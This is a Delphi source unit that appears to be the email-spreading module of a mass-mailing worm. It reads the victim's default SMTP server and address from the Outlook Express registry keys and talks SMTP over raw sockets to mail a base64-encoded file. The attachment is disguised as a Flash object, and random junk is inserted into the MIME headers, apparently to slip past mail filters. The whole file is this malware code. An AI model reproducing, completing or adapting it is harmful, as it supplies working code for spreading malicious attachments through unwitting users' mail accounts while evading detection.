UNIT Email;

INTERFACE

USES
  Registry, Utils;

PROCEDURE SendEmail(Subject,Body,From,Recip,AttachmentPath,AttachmentName:AnsiString);

IMPLEMENTATION

CONST
  WinSocket    = 'wsock32.dll';
  SOCKET_ERROR = -1;
  AF_INET      = 2;
  SOCK_STREAM  = 1;
  IPPROTO_IP   = 0;
  Code64       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=*-/][.,><? !~@#$%^&';

TYPE
  SunB = PACKED RECORD
    s_b1 : Char;
    s_b2 : Char;
    s_b3 : Char;
    s_b4 : Char;
  END;

  SunW = PACKED RECORD
    s_w1 : WORD;
    s_w2 : WORD;
  END;

  WSAData = RECORD
    wVersion        : WORD;
    wHighVersion    : WORD;
    szDescription   : ARRAY[0..256] OF Char;
    szSystemStatus  : ARRAY[0..128] OF Char;
    iMaxSockets     : WORD;
    iMaxUdpDg       : WORD;
    lpVendorInfo    : pChar;
  END;

  in_addr = RECORD
    CASE Integer OF
      0 : (S_un_b : SunB);
      1 : (S_un_w : SunW);
      2 : (S_addr : DWORD);
    END;

  TInAddr = in_addr;

  sockaddr_in = RECORD
    CASE Integer OF
      0 : (sin_family : WORD;
           sin_port   : WORD;
           sin_addr   : TInAddr;
           sin_zero   : ARRAY[0..7] OF Char);
      1 : (sa_family  : WORD;
           sa_data    : ARRAY[0..13] OF Char)
  END;

  PHostEnt = ^THostEnt;

  HostEnt = RECORD
    h_name     : pChar;
    h_aliases  :^pChar;
    h_addrtype : SmallInt;
    h_length   : SmallInt;
    CASE BYTE OF
      0: (h_addr_list :^pChar);
      1: (h_addr      :^pChar)
  END;

  THostEnt    = HostEnt;
  TSocket     = Integer;
  HINTERNET   = Pointer;
  DWORD       = LongWord;
  BOOL        = LongBool;
  TWSAData    = WSAData;
  PInAddr     =^TInAddr;
  TSockAddrIn = sockaddr_in;
  TSockAddr   = sockaddr_in;
  UINT        = LongWord;
  TFileBuf    = ARRAY[1..300000] OF BYTE;   //Ez lehet kisebb is
  Triple      = ARRAY[1..3] OF BYTE;
  Quad        = ARRAY[1..4] OF BYTE;

VAR
  Wsadatas   : TWSADATA;
  SockAddrIn : TSockAddrIn;
  Sock       : TSocket;
  Buf        : ARRAY[0..255] OF Char;
  FileBuf    : TFileBuf;
  MySmtp     : STRING;
  iAddr      : Integer;
  SMTPServer : STRING;
  SMTPAcc    : STRING;

FUNCTION Send(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL; EXTERNAL WinSocket Name 'send';
FUNCTION WSAStartup(wVersionRequired:WORD;VAR WSData: TWSAData) : Integer; STDCALL; EXTERNAL WinSocket Name 'WSAStartup';
FUNCTION Socket(Af,Struct,Protocol:Integer) : TSocket; STDCALL; EXTERNAL WinSocket Name 'socket';
FUNCTION Htons(HostShort:WORD) : WORD; STDCALL; EXTERNAL WinSocket Name 'htons';
FUNCTION inet_addr(CP:PChar) : DWORD; STDCALL; EXTERNAL WinSocket Name 'inet_addr';
FUNCTION Connect(S:TSocket;VAR Name:TSockAddr;Namelen:Integer) : Integer; STDCALL; EXTERNAL WinSocket Name 'connect';
FUNCTION Recv(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL; EXTERNAL WinSocket Name 'recv';
FUNCTION CloseSocket(S:TSocket) : Integer; STDCALL; EXTERNAL WinSocket Name 'closesocket';
FUNCTION inet_ntoa(n_addr:in_addr) : pChar; STDCALL; EXTERNAL WinSocket Name 'inet_ntoa';
FUNCTION GetHostByName(HostName:pChar) : PHostEnt; STDCALL; EXTERNAL WinSocket Name 'gethostbyname';
FUNCTION WSACleanup() : Integer; STDCALL; EXTERNAL WinSocket Name 'WSACleanup';

FUNCTION PolyString(STR:STRING) : STRING;
VAR
  I : WORD;
  L : WORD;
  K : WORD;
  T : STRING;
BEGIN
  Randomize;
  FOR I:=1 TO Length(Str) DO BEGIN
    L:=Random(5)+1;
    T:=T+STR[I]+'(';
    FOR K:=1 TO L DO T:=T+Code64[Random(82)+1];
    T:=T+')';
  END;
  RESULT:=T;
END;

FUNCTION NameToIP(HostName:STRING) : STRING;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;

PROCEDURE ReadRegistryDefaults;                    //Get Default SMTP Server
VAR
  Registry   : TRegistry;
  AccountStr : STRING;
begin
  Registry:=TRegistry.Create;
  TRY
    Registry.RootKey:=HKEY_CURRENT_USER;
    IF Registry.OpenKey('software\microsoft\internet account manager',False) THEN BEGIN
      AccountStr:=Registry.ReadString('default mail account');
      Registry.CloseKey;
      IF (AccountStr<>'') THEN
        IF Registry.OpenKey('software\microsoft\internet account manager\accounts\'+AccountStr,False) THEN BEGIN
          SMTPServer:=Registry.ReadString('SMTP Server');
          SMTPAcc:=Registry.ReadString('SMTP Email Address');
          Registry.CloseKey;
        END;
    END;
  FINALLY
    Registry.Free;
  END;
END;

FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
VAR
  Q    : Quad;
  Strg : STRING;
BEGIN
  IF Count<3 THEN BEGIN
    T[3]:=0;
    Q[4]:=64;
  END ELSE Q[4]:=(T[3] AND $3F);
  IF Count<2 THEN BEGIN
    T[2]:=0;
    Q[3]:=64;
  END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
  Q[2]:=Byte(((T[1] SHL 4) OR (t[2] SHR 4)) AND $3F);
  Q[1]:=((T[1] SHR 2) AND $3F);
  Strg:='';
  FOR Count:=1 TO 4 DO Strg:=(Strg+Code64[(Q[Count]+1)]);
  RESULT:=Strg;
END;

FUNCTION BASE64(DataLength:DWORD) : AnsiString;
VAR
  B      : AnsiString;
  I      : DWORD;
  Remain : DWORD;
  Trip   : Triple;
  Count  : WORD;
BEGIN
  Count:=0;
  B:='';
  FOR I:=1 TO DataLength DIV 3 DO BEGIN
    INC(Count,4);
    Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
    Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
    Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
    B:=B+codeb64(3,Trip);
    IF Count=76 THEN BEGIN
      B:=B+CRLF;
      Count:=0;
    END;
  END;
  Remain:=DataLength-(DataLength DIV 3)*3;
  IF Remain>0 THEN BEGIN
    Trip[1]:=Ord(FileBuf[DataLength-1]);
    IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
    IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
  END;
  RESULT:=B;
END;

PROCEDURE Mys(STR:STRING);
VAR
  I : DWORD;
BEGIN
  FOR I:=1 TO Length(STR) DO IF Send(Sock,STR[I],1,0)=SOCKET_ERROR THEN exit;
END;

PROCEDURE SendEmail(Subject,Body,From,Recip,AttachmentPath,AttachmentName:AnsiString);
VAR
  F : FILE;
BEGIN
  ReadRegistryDefaults;
  MySmtp:=NameToIP(SMTPServer);
  WSAStartUp(257,wsadatas);
  Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
  SockAddrIn.sin_family:=AF_INET;
  htons(25);
  SockAddrIn.sin_port:=htons(25);
  iaddr:=inet_addr(PChar(MySmtp));
  SockAddrIn.sin_addr.S_addr:=iaddr;
  Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
  Recv(Sock,Buf,Sizeof(Buf),0);
  Mys('HELO '+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('MAIL FROM: '+From+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('RCPT TO: '+Recip+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('DATA'+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('Content-Type: '+PolyString('multipart/mixed;')+CRLF);
  Mys('    boundary="bla"'+CRLF);
  Mys('Subject: '+Subject+CRLF);
  Mys('--bla'+CRLF);
  Mys('Content-Type: '+PolyString('text/plain; charset:us-ascii')+CRLF+CRLF);
  Mys(Body+CRLF+CRLF);
  Mys('--bla'+CRLF);
  Mys('Content-Type: '+PolyString('application/x-shockwave-flash;')+CRLF);
  Mys('    name="'+AttachmentName+'"'+CRLF);
  Mys('Content-Transfer-Encoding: '+PolyString('base64')+CRLF);
  Mys('Content-ID: <EMAIL>'+CRLF+CRLF);


  AssignFile(F,AttachmentPath+AttachmentName);
  IF FileExists(AttachmentPath+AttachmentName) THEN BEGIN
    Reset(F,1);
    BlockRead(F,FileBuf[1],FileSize(F));
    Mys(BASE64(FileSize(F)));
    CloseFile(F);
  END;

  Mys(CRLF+'--bla--'+CRLF);
  Mys(CRLF+'.'+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
  Mys('QUIT'+CRLF);
  Recv(Sock,Buf,SizeOf(Buf),0);
END;
END.

